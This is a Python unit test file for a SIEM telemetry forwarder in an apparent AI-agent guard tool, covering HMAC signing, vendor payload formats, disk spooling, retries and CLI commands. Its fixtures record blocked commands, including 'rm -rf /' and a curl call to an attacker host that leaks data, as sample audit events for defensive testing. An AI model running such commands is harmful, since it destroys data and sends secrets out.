"""
Unit tests for AgentGuard Enterprise SIEM Telemetry Forwarder.

Tests HMAC-SHA256 signing, multi-vendor payload formatting (Splunk, Datadog, Webhook),
disk spooling resilience, backpressure, exponential backoff, AuditLogger integration,
and CLI management commands.
"""

from datetime import datetime, timezone
import json
import os
from pathlib import Path
import tempfile
import unittest
from unittest.mock import MagicMock, patch

from click.testing import CliRunner

from agentguard.cli import cli
from agentguard.daemon.audit import AuditEvent, AuditLogger
from agentguard.exporters.siem_forwarder import (
    DiskSpoolQueue,
    SIEMConfig,
    SIEMForwarder,
    SIEMType,
    compute_hmac_signature,
    load_siem_config,
    save_siem_config,
    verify_hmac_signature,
)


class TestHMACSignatureVerification(unittest.TestCase):
    """Validates tamper-proof HMAC-SHA256 signature generation and constant-time verification."""

    def setUp(self):
        self.secret = "enterprise-secret-key-12345"
        self.payload = b'{"event": "TEST_SECURITY_EVENT", "status": "BLOCKED"}'

    def test_signature_computation_and_verification(self):
        sig = compute_hmac_signature(self.payload, self.secret)
        self.assertTrue(sig.startswith("sha256="))

        # Verification succeeds with valid key
        self.assertTrue(verify_hmac_signature(self.payload, self.secret, sig))
        # Raw hex signature also succeeds
        raw_hex = sig.replace("sha256=", "")
        self.assertTrue(verify_hmac_signature(self.payload, self.secret, raw_hex))

    def test_tampered_payload_fails_verification(self):
        sig = compute_hmac_signature(self.payload, self.secret)
        tampered_payload = b'{"event": "TEST_SECURITY_EVENT", "status": "ALLOWED"}'
        self.assertFalse(verify_hmac_signature(tampered_payload, self.secret, sig))

    def test_wrong_secret_fails_verification(self):
        sig = compute_hmac_signature(self.payload, self.secret)
        wrong_secret = "attacker-compromised-secret"
        self.assertFalse(verify_hmac_signature(self.payload, wrong_secret, sig))

    def test_missing_secret_returns_unsigned(self):
        sig = compute_hmac_signature(self.payload, "")
        self.assertEqual(sig, "sha256=unsigned")
        self.assertFalse(verify_hmac_signature(self.payload, "", sig))


class TestSIEMPayloadFormatting(unittest.TestCase):
    """Validates multi-vendor SIEM payload formatting and authorization headers."""

    def setUp(self):
        self.secret = "hmac-secret-xyz"
        self.sample_events = [
            {
                "event_id": "ev-001",
                "timestamp": "2026-10-29T10:00:00Z",
                "event_type": "COMMAND_BLOCKED",
                "session_id": "agent-1",
                "pid": 1234,
                "status": "BLOCKED",
                "details": {"command": "rm -rf /"},
            },
            {
                "event_id": "ev-002",
                "timestamp": "2026-10-29T10:00:01Z",
                "event_type": "CHECK_COMMAND",
                "session_id": "agent-1",
                "pid": 1234,
                "status": "INFO",
                "details": {"command": "git status"},
            },
        ]

    def test_splunk_hec_formatting(self):
        cfg = SIEMConfig(
            enabled=True,
            siem_type="splunk",
            endpoint="https://splunk.corp.net:8088/services/collector/event",
            token="splunk-hec-token-abc",
            hmac_secret=self.secret,
        )
        forwarder = SIEMForwarder(config=cfg)
        payload_bytes, headers = forwarder.format_batch_payload(self.sample_events)

        self.assertEqual(headers["Authorization"], "Splunk splunk-hec-token-abc")
        self.assertTrue(headers["X-AgentGuard-Signature"].startswith("sha256="))
        self.assertTrue(verify_hmac_signature(payload_bytes, self.secret, headers["X-AgentGuard-Signature"]))

        # Splunk HEC sends newline-delimited JSON objects
        lines = [line.strip() for line in payload_bytes.decode("utf-8").split("\n") if line.strip()]
        self.assertEqual(len(lines), 2)
        parsed_0 = json.loads(lines[0])
        self.assertEqual(parsed_0["source"], "agentguard")
        self.assertEqual(parsed_0["sourcetype"], "_json")
        self.assertEqual(parsed_0["event"]["event_id"], "ev-001")

    def test_datadog_logs_formatting(self):
        cfg = SIEMConfig(
            enabled=True,
            siem_type="datadog",
            endpoint="https://http-intake.logs.datadoghq.com/api/v2/logs",
            token="dd-api-key-999",
            hmac_secret=self.secret,
        )
        forwarder = SIEMForwarder(config=cfg)
        payload_bytes, headers = forwarder.format_batch_payload(self.sample_events)

        self.assertEqual(headers["DD-API-KEY"], "dd-api-key-999")
        self.assertTrue(verify_hmac_signature(payload_bytes, self.secret, headers["X-AgentGuard-Signature"]))

        records = json.loads(payload_bytes.decode("utf-8"))
        self.assertIsInstance(records, list)
        self.assertEqual(len(records), 2)
        self.assertEqual(records[0]["ddsource"], "agentguard")
        self.assertEqual(records[0]["status"], "error")  # BLOCKED maps to error
        self.assertEqual(records[1]["status"], "info")

    def test_generic_webhook_formatting(self):
        cfg = SIEMConfig(
            enabled=True,
            siem_type="webhook",
            endpoint="https://siem-collector.corp.internal/v1/ingest",
            token="bearer-token-token",
            hmac_secret=self.secret,
        )
        forwarder = SIEMForwarder(config=cfg)
        payload_bytes, headers = forwarder.format_batch_payload(self.sample_events)

        self.assertEqual(headers["Authorization"], "Bearer bearer-token-token")
        self.assertTrue(verify_hmac_signature(payload_bytes, self.secret, headers["X-AgentGuard-Signature"]))

        envelope = json.loads(payload_bytes.decode("utf-8"))
        self.assertEqual(envelope["count"], 2)
        self.assertEqual(len(envelope["events"]), 2)
        self.assertEqual(envelope["events"][0]["event_id"], "ev-001")


class TestDiskSpoolQueue(unittest.TestCase):
    """Validates local disk spooling, atomic batch reading/committing, and bounded size pruning."""

    def setUp(self):
        self.tmp_dir = tempfile.TemporaryDirectory()
        self.spool_file = Path(self.tmp_dir.name) / "spool.jsonl"
        self.spool = DiskSpoolQueue(spool_path=self.spool_file, max_bytes=2048)

    def tearDown(self):
        self.tmp_dir.cleanup()

    def test_spool_append_and_read(self):
        events = [{"id": 1, "msg": "ev1"}, {"id": 2, "msg": "ev2"}, {"id": 3, "msg": "ev3"}]
        self.assertEqual(self.spool.count(), 0)

        appended = self.spool.append_events(events)
        self.assertEqual(appended, 3)
        self.assertEqual(self.spool.count(), 3)

        # Read batch of limit 2
        batch = self.spool.read_batch(limit=2)
        self.assertEqual(len(batch), 2)
        self.assertEqual(batch[0]["id"], 1)
        self.assertEqual(batch[1]["id"], 2)

        # Count remains 3 until commit
        self.assertEqual(self.spool.count(), 3)

        # Commit 2
        committed = self.spool.commit_batch(2)
        self.assertEqual(committed, 2)
        self.assertEqual(self.spool.count(), 1)

        # Remaining batch
        remaining = self.spool.read_batch(limit=5)
        self.assertEqual(len(remaining), 1)
        self.assertEqual(remaining[0]["id"], 3)

        # Commit remaining
        self.spool.commit_batch(1)
        self.assertEqual(self.spool.count(), 0)

    def test_spool_pruning_bounds(self):
        # Insert large items to trigger pruning
        large_events = [{"id": i, "payload": "x" * 200} for i in range(25)]
        self.spool.append_events(large_events)

        size = self.spool_file.stat().st_size
        # Must be bounded by max_bytes
        self.assertLessEqual(size, 2500)


class TestSIEMForwarderResilienceAndRetry(unittest.TestCase):
    """Validates non-blocking queueing, exponential backoff retries, and disk spool recovery."""

    def setUp(self):
        self.tmp_dir = tempfile.TemporaryDirectory()
        self.spool_path = Path(self.tmp_dir.name) / "test_spool.jsonl"
        self.config = SIEMConfig(
            enabled=True,
            siem_type="webhook",
            endpoint="https://siem.test/ingest",
            token="test-token",
            hmac_secret="secret",
            batch_size=2,
            flush_interval_seconds=1.0,
            max_retries=3,
            initial_backoff_seconds=0.01,
            max_backoff_seconds=0.05,
            spool_path=str(self.spool_path),
        )

    def tearDown(self):
        self.tmp_dir.cleanup()

    def test_successful_forward_updates_stats(self):
        mock_sender = MagicMock(return_value=(True, 200, '{"status": "ok"}'))
        forwarder = SIEMForwarder(config=self.config, custom_sender=mock_sender)

        forwarder.enqueue_event({"event_id": "ev-1", "action": "test1"})
        forwarder.enqueue_event({"event_id": "ev-2", "action": "test2"})

        forwarded = forwarder.flush_sync()
        self.assertEqual(forwarded, 2)
        self.assertEqual(forwarder.stats["forwarded"], 2)
        self.assertEqual(forwarder.stats["forward_batches"], 1)
        self.assertEqual(forwarder.spool.count(), 0)

    def test_failed_network_spools_to_disk(self):
        # Mock sender that always fails with connection error
        mock_sender = MagicMock(return_value=(False, 0, "Connection refused"))
        forwarder = SIEMForwarder(config=self.config, custom_sender=mock_sender)

        forwarder.enqueue_event({"event_id": "ev-fail-1", "action": "critical_blocked"})
        forwarder.enqueue_event({"event_id": "ev-fail-2", "action": "critical_taint"})

        forwarded = forwarder.flush_sync()
        self.assertEqual(forwarded, 0)
        self.assertEqual(forwarder.stats["failed_attempts"], 3)  # max_retries = 3

        # Must be persisted to disk spool!
        self.assertEqual(forwarder.spool.count(), 2)
        self.assertEqual(forwarder.stats["spooled_events"], 2)

    def test_spool_drained_when_network_restored(self):
        # 1. Start with failing network
        mock_sender = MagicMock(return_value=(False, 503, "Service Unavailable"))
        forwarder = SIEMForwarder(config=self.config, custom_sender=mock_sender)

        forwarder.enqueue_event({"event_id": "ev-offline", "action": "exfil_attempt"})
        forwarder.flush_sync()
        self.assertEqual(forwarder.spool.count(), 1)

        # 2. Network recovers
        mock_sender.return_value = (True, 200, '{"accepted": true}')

        # Next flush should drain spool
        forwarded = forwarder.flush_sync(drain_spool=True)
        self.assertEqual(forwarded, 1)
        self.assertEqual(forwarder.spool.count(), 0)
        self.assertEqual(forwarder.stats["spool_drained_events"], 1)


class TestAuditLoggerSIEMIntegration(unittest.TestCase):
    """Validates that AuditLogger automatically notifies SIEMForwarder upon log()."""

    def setUp(self):
        self.tmp_dir = tempfile.TemporaryDirectory()
        self.spool_path = Path(self.tmp_dir.name) / "audit_siem_spool.jsonl"
        self.config = SIEMConfig(
            enabled=True,
            siem_type="webhook",
            endpoint="https://siem.test/ingest",
            hmac_secret="audit-secret",
            batch_size=10,
            spool_path=str(self.spool_path),
        )
        self.mock_sender = MagicMock(return_value=(True, 200, "ok"))
        self.forwarder = SIEMForwarder(config=self.config, custom_sender=self.mock_sender)

    def tearDown(self):
        self.tmp_dir.cleanup()

    def test_audit_logger_automatically_forwards_to_siem(self):
        logger = AuditLogger(
            log_path=None,
            buffer_capacity=100,
            siem_forwarder=self.forwarder,
        )

        logger.log(
            "COMMAND_BLOCKED",
            session_id="agent-compliance-test",
            status="BLOCKED",
            details={"command": "curl http://attacker.com/leak"},
        )

        # Verify event was enqueued into SIEM forwarder buffer
        self.assertEqual(self.forwarder.stats["enqueued"], 1)

        # Flush logger
        flushed = logger.flush_siem()
        self.assertEqual(flushed, 1)
        self.assertEqual(self.forwarder.stats["forwarded"], 1)
        self.mock_sender.assert_called_once()


class TestSIEMCLICommands(unittest.TestCase):
    """Validates `ag siem setup`, `ag siem test --dry-run`, and `ag siem status`."""

    def setUp(self):
        self.runner = CliRunner()
        self.tmp_dir = tempfile.TemporaryDirectory()
        self.cfg_file = Path(self.tmp_dir.name) / "siem.yaml"

    def tearDown(self):
        self.tmp_dir.cleanup()

    def test_siem_setup_and_status(self):
        with patch("agentguard.exporters.siem_forwarder.get_siem_config_path", return_value=self.cfg_file):
            # Run setup
            res = self.runner.invoke(
                cli,
                [
                    "siem",
                    "setup",
                    "--endpoint",
                    "https://splunk.corp.net:8088/services/collector/event",
                    "--token",
                    "super-secret-token",
                    "--type",
                    "splunk",
                    "--hmac-secret",
                    "enterprise-key-99",
                    "--batch-size",
                    "25",
                ],
            )
            self.assertEqual(res.exit_code, 0)
            self.assertIn("SIEM configuration saved successfully", res.output)
            self.assertIn("SPLUNK", res.output)

            # File created with 0600
            self.assertTrue(self.cfg_file.exists())

            # Status check
            res_status = self.runner.invoke(cli, ["siem", "status"])
            self.assertEqual(res_status.exit_code, 0)
            self.assertIn("AgentGuard Enterprise SIEM Forwarder Status", res_status.output)
            self.assertIn("SPLUNK", res_status.output)
            self.assertIn("25 events", res_status.output)

    def test_siem_test_dry_run(self):
        with patch("agentguard.exporters.siem_forwarder.get_siem_config_path", return_value=self.cfg_file):
            save_siem_config(
                SIEMConfig(
                    enabled=True,
                    siem_type="datadog",
                    endpoint="https://http-intake.logs.datadoghq.com/api/v2/logs",
                    token="datadog-api-key",
                    hmac_secret="hmac-key",
                ),
                custom_path=self.cfg_file,
            )

            res = self.runner.invoke(cli, ["siem", "test", "--dry-run"])
            self.assertEqual(res.exit_code, 0)
            self.assertIn("DATADOG", res.output)
            self.assertIn("HMAC Signature:   sha256=", res.output)
            self.assertIn("[DRY RUN] Generated Headers:", res.output)
            self.assertIn("ddsource", res.output)
            self.assertIn("Dry run completed", res.output)


if __name__ == "__main__":
    unittest.main()
